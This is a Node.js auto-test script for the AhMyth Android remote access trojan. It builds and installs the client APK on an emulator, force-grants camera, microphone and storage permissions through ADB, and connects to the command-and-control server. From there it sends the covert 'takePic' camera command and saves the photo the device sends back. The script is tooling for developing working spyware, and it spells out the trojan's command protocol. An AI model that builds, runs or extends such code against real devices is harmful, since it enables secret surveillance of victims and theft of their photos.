#!/usr/bin/env node
/**
 * Auto-test script for image sending only
 * - Builds APK from latest source
 * - Installs on emulator
 * - Launches app
 * - Sends camera capture command
 * - Waits for image to be received and saved
 * - Verifies image file exists
 */

const { exec, spawn } = require('child_process');
const { promisify } = require('util');
const path = require('path');
const fs = require('fs');
const io = require('socket.io-client');

const execAsync = promisify(exec);

// Configuration
const SERVER_PORT = 1234;
const SERVER_URL = `http://localhost:${SERVER_PORT}`;
const PACKAGE_NAME = 'ahmyth.mine.king.ahmyth';
const CLIENT_DIR = path.join(__dirname, 'AhMyth-Client');
const APK_OUTPUT = path.join(CLIENT_DIR, 'app', 'build', 'outputs', 'apk', 'debug', 'app-debug.apk');
const TEST_TIMEOUT = 120000; // 2 minutes
const IMAGE_WAIT_TIMEOUT = 60000; // 1 minute for image

// Colors
const colors = {
    reset: "\x1b[0m",
    red: "\x1b[31m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    cyan: "\x1b[36m",
    blue: "\x1b[34m"
};

function log(msg, type = 'info') {
    const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
    let color = colors.reset;
    switch(type) {
        case 'success': color = colors.green; break;
        case 'error': color = colors.red; break;
        case 'warn': color = colors.yellow; break;
        case 'header': color = colors.cyan; break;
        case 'info': color = colors.blue; break;
    }
    console.log(`${color}[${timestamp}] ${msg}${colors.reset}`);
}

async function checkAdbDevice() {
    try {
        const { stdout } = await execAsync('adb devices');
        const lines = stdout.split('\n').filter(line => line.trim() && !line.includes('List of devices'));
        const devices = lines.filter(line => line.includes('device') && !line.includes('offline'));
        
        if (devices.length === 0) {
            log('No ADB devices found', 'error');
            return null;
        }
        
        const deviceId = devices[0].split('\t')[0];
        log(`Found device: ${deviceId}`, 'success');
        return deviceId;
    } catch (error) {
        log(`ADB check failed: ${error.message}`, 'error');
        return null;
    }
}

async function buildApk() {
    log('Building APK from latest source...', 'header');
    
    try {
        // Clean first
        log('Cleaning previous build...', 'info');
        await execAsync('cd AhMyth-Client && gradlew.bat clean', { 
            cwd: __dirname,
            maxBuffer: 10 * 1024 * 1024 
        });
        
        // Build debug APK
        log('Building debug APK...', 'info');
        const { stdout, stderr } = await execAsync('cd AhMyth-Client && gradlew.bat assembleDebug', {
            cwd: __dirname,
            maxBuffer: 10 * 1024 * 1024
        });
        
        if (stderr && !stderr.includes('Warning')) {
            log(`Build warnings: ${stderr.substring(0, 200)}`, 'warn');
        }
        
        // Check if APK exists
        if (!fs.existsSync(APK_OUTPUT)) {
            throw new Error('APK not found after build');
        }
        
        const apkSize = fs.statSync(APK_OUTPUT).size;
        log(`APK built successfully: ${(apkSize / 1024 / 1024).toFixed(2)} MB`, 'success');
        return APK_OUTPUT;
    } catch (error) {
        log(`Build failed: ${error.message}`, 'error');
        throw error;
    }
}

async function installApk(deviceId, apkPath) {
    log(`Installing APK on device ${deviceId}...`, 'header');
    
    try {
        // Uninstall first to ensure clean install
        log('Uninstalling existing app...', 'info');
        try {
            await execAsync(`adb -s ${deviceId} uninstall ${PACKAGE_NAME}`);
        } catch (e) {
            // Ignore if not installed
        }
        
        // Install
        log('Installing APK...', 'info');
        const { stdout, stderr } = await execAsync(`adb -s ${deviceId} install -r "${apkPath}"`);
        
        if (stderr && !stderr.includes('Success')) {
            throw new Error(`Install failed: ${stderr}`);
        }
        
        log('APK installed successfully', 'success');
        return true;
    } catch (error) {
        log(`Install failed: ${error.message}`, 'error');
        throw error;
    }
}

async function grantPermissions(deviceId) {
    log('Granting camera permissions...', 'header');
    
    try {
        // Grant camera permission
        await execAsync(`adb -s ${deviceId} shell pm grant ${PACKAGE_NAME} android.permission.CAMERA`);
        log('Camera permission granted', 'success');
        
        // Grant other essential permissions
        const permissions = [
            'android.permission.RECORD_AUDIO',
            'android.permission.READ_EXTERNAL_STORAGE',
            'android.permission.WRITE_EXTERNAL_STORAGE',
            'android.permission.POST_NOTIFICATIONS'
        ];
        
        for (const perm of permissions) {
            try {
                await execAsync(`adb -s ${deviceId} shell pm grant ${PACKAGE_NAME} ${perm}`);
            } catch (e) {
                // Ignore individual permission failures
            }
        }
    } catch (error) {
        log(`Permission grant failed: ${error.message}`, 'warn');
        // Continue anyway
    }
}

async function launchApp(deviceId) {
    log('Launching app...', 'header');
    
    try {
        // Grant permissions first
        await grantPermissions(deviceId);
        
        // Start main activity
        await execAsync(`adb -s ${deviceId} shell am start -n ${PACKAGE_NAME}/.MainActivity`);
        log('App launched', 'success');
        
        // Wait a bit for app to initialize
        await new Promise(resolve => setTimeout(resolve, 3000));
        return true;
    } catch (error) {
        log(`Launch failed: ${error.message}`, 'error');
        throw error;
    }
}

async function waitForServer() {
    log('Waiting for server to be ready...', 'info');
    
    const maxAttempts = 30;
    for (let i = 0; i < maxAttempts; i++) {
        try {
            // Try to connect to server
            const http = require('http');
            await new Promise((resolve, reject) => {
                const req = http.get(`${SERVER_URL}/socket.io/?EIO=4&transport=polling`, (res) => {
                    if (res.statusCode === 200 || res.statusCode === 400) {
                        resolve();
                    } else {
                        reject(new Error(`Status ${res.statusCode}`));
                    }
                });
                req.on('error', reject);
                req.setTimeout(2000, () => {
                    req.destroy();
                    reject(new Error('Timeout'));
                });
            });
            log('Server is ready', 'success');
            return true;
        } catch (e) {
            // Server not ready yet
        }
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    throw new Error('Server not ready after 30 seconds');
}

async function testImageSending() {
    log('Starting image sending test...', 'header');
    
    return new Promise((resolve, reject) => {
        let socket = null;
        let imageReceived = false;
        let imagePath = null;
        let testTimeout = null;
        let imageTimeout = null;
        
        const cleanup = () => {
            if (socket) {
                socket.disconnect();
                socket = null;
            }
            if (testTimeout) clearTimeout(testTimeout);
            if (imageTimeout) clearTimeout(imageTimeout);
        };
        
        // Overall test timeout
        testTimeout = setTimeout(() => {
            cleanup();
            reject(new Error('Test timeout - no response received'));
        }, TEST_TIMEOUT);
        
        // Connect to server
        log('Connecting to server...', 'info');
        socket = io(SERVER_URL, {
            transports: ['websocket', 'polling'],
            reconnection: false,
            timeout: 10000
        });
        
        socket.on('connect', () => {
            log('Connected to server', 'success');
            
            // Wait for client to connect
            log('Waiting for client to connect...', 'info');
            socket.on('x0000', (data) => {
                log(`Client connected: ${data.id || 'unknown'}`, 'success');
                log(`Device: ${data.manf || 'Unknown'} ${data.model || 'Unknown'}`, 'info');
                
                // Request camera list first
                log('Requesting camera list...', 'info');
                socket.emit('x0000ca', { action: 'camList' });
            });
            
            // Listen for camera list response
            socket.on('x0000ca', async (data) => {
                if (data.camList === true && Array.isArray(data.list)) {
                    log(`Found ${data.list.length} camera(s)`, 'success');
                    
                    if (data.list.length === 0) {
                        cleanup();
                        reject(new Error('No cameras available'));
                        return;
                    }
                    
                    // Use first available camera (usually back camera)
                    const cameraId = data.list[0].id;
                    log(`Taking photo with camera ${cameraId} (${data.list[0].name})...`, 'info');
                    
                    // Set up image timeout
                    imageTimeout = setTimeout(() => {
                        cleanup();
                        reject(new Error('Image timeout - photo not received within 60 seconds'));
                    }, IMAGE_WAIT_TIMEOUT);
                    
                    // Take photo
                    socket.emit('x0000ca', { 
                        action: 'takePic', 
                        cameraID: cameraId 
                    });
                    
                    log('Camera capture command sent, waiting for image...', 'info');
                } else if (data.image === true) {
                    // Image received!
                    imageReceived = true;
                    log('Image received!', 'success');
                    
                    // Save image
                    try {
                        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
                        const imageDir = path.join(__dirname, 'test-images');
                        if (!fs.existsSync(imageDir)) {
                            fs.mkdirSync(imageDir, { recursive: true });
                        }
                        
                        imagePath = path.join(imageDir, `test_photo_${timestamp}.jpg`);
                        
                        let imageBuffer;
                        if (typeof data.buffer === 'string') {
                            // Base64 string (blockchain mode)
                            imageBuffer = Buffer.from(data.buffer, 'base64');
                        } else if (Array.isArray(data.buffer)) {
                            // Byte array
                            imageBuffer = Buffer.from(data.buffer);
                        } else if (data.buffer instanceof Uint8Array) {
                            imageBuffer = Buffer.from(data.buffer);
                        } else {
                            throw new Error('Unknown buffer format');
                        }
                        
                        fs.writeFileSync(imagePath, imageBuffer);
                        const sizeKB = (imageBuffer.length / 1024).toFixed(2);
                        log(`Image saved: ${imagePath} (${sizeKB} KB)`, 'success');
                        
                        // Also check if image was auto-saved by server in downloads folder
                        // Server saves to: <homedir>/AhMyth/Downloads/photo_*.jpg
                        const os = require('os');
                        const homedir = os.homedir();
                        const downloadsPath = path.join(homedir, 'AhMyth', 'Downloads');
                        let autoSavedPath = null;
                        
                        // Wait a bit for server to save the file
                        await new Promise(resolve => setTimeout(resolve, 2000));
                        
                        if (fs.existsSync(downloadsPath)) {
                            const files = fs.readdirSync(downloadsPath)
                                .filter(f => f.startsWith('photo_') && f.endsWith('.jpg'))
                                .map(f => ({
                                    name: f,
                                    path: path.join(downloadsPath, f),
                                    time: fs.statSync(path.join(downloadsPath, f)).mtime
                                }))
                                .sort((a, b) => b.time - a.time);
                            
                            if (files.length > 0) {
                                const recentFile = files[0];
                                const fileAge = Date.now() - recentFile.time.getTime();
                                if (fileAge < 120000) { // File created in last 2 minutes
                                    autoSavedPath = recentFile.path;
                                    const autoSize = (fs.statSync(autoSavedPath).size / 1024).toFixed(2);
                                    log(`Image also auto-saved by server: ${autoSavedPath} (${autoSize} KB)`, 'success');
                                }
                            }
                        } else {
                            log(`Downloads folder not found: ${downloadsPath}`, 'warn');
                        }
                        
                        // Verify file exists and has content
                        if (fs.existsSync(imagePath) && fs.statSync(imagePath).size > 0) {
                            cleanup();
                            resolve({
                                success: true,
                                imagePath: imagePath,
                                autoSavedPath: autoSavedPath,
                                size: imageBuffer.length,
                                sizeKB: parseFloat(sizeKB)
                            });
                        } else {
                            cleanup();
                            reject(new Error('Image file was not saved correctly'));
                        }
                    } catch (error) {
                        cleanup();
                        reject(new Error(`Failed to save image: ${error.message}`));
                    }
                } else if (data.error) {
                    cleanup();
                    reject(new Error(`Camera error: ${data.error}`));
                }
            });
            
            socket.on('connect_error', (error) => {
                cleanup();
                reject(new Error(`Connection error: ${error.message}`));
            });
            
            socket.on('disconnect', () => {
                if (!imageReceived) {
                    cleanup();
                    reject(new Error('Disconnected before receiving image'));
                }
            });
        });
    });
}

async function main() {
    try {
        log('=== Image Sending Auto-Test ===', 'header');
        
        // Step 1: Check ADB device
        const deviceId = await checkAdbDevice();
        if (!deviceId) {
            throw new Error('No ADB device available');
        }
        
        // Step 2: Build APK
        const apkPath = await buildApk();
        
        // Step 3: Install APK
        await installApk(deviceId, apkPath);
        
        // Step 4: Launch app
        await launchApp(deviceId);
        
        // Step 5: Wait for server (if not already running)
        try {
            await waitForServer();
        } catch (e) {
            log('Server not running - please start it manually with: bun run dev', 'warn');
            log('Waiting 10 seconds for you to start the server...', 'info');
            await new Promise(resolve => setTimeout(resolve, 10000));
            await waitForServer();
        }
        
        // Step 6: Test image sending
        const result = await testImageSending();
        
        log('=== Test Complete ===', 'header');
        log(`✓ Image received and saved successfully`, 'success');
        log(`  Test Path: ${result.imagePath}`, 'info');
        if (result.autoSavedPath) {
            log(`  Auto-saved Path: ${result.autoSavedPath}`, 'info');
        }
        log(`  Size: ${result.sizeKB} KB`, 'info');
        
        process.exit(0);
    } catch (error) {
        log(`=== Test Failed ===`, 'error');
        log(`Error: ${error.message}`, 'error');
        process.exit(1);
    }
}

// Run if called directly
if (require.main === module) {
    main();
}

module.exports = { main, testImageSending };

